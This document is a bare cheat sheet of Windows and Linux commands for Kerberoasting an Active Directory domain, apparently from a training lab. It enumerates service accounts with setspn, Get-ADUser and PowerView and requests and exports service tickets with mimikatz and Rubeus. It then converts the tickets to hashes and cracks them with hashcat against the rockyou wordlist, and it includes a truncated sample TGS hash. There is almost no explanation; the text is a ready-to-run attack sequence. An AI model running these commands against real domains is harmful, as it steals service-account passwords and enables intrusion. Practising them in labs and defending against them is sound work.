
Windows commands for Kerberoasting
```
setspn.exe -Q */*
```

```
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "vmware/inlanefreight.local:1433"
```
```
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

```
mimikatz # base64 /out:true

mimikatz # kerberos::list /export 

echo "<base64 blob>" |  tr -d \\n

cat encoded_file | base64 -d > sqldev.kirbi

python2.7 kirbi2john.py sqldev.kirbi

sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

cat sqldev_tgs_hashcat 

$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c97acf433841b2ef2478b425865dc75c39b1dce7f50dedcc29fc8a97aef8d51a22c5720ee614fcb646e28d854bcdc2c8b362bbfaf62dcd9933c55e  Deleted alot of the hash

hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt


```

Windows commands
```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

```
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

.\Rubeus.exe kerberoast /stats

.\Rubeus.exe kerberoast /user:testspn /nowrap


Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
```

Checking supported encryption types
```
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

Requesting a new ticket
```
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

 mode 19700, which is Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96)
```
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```

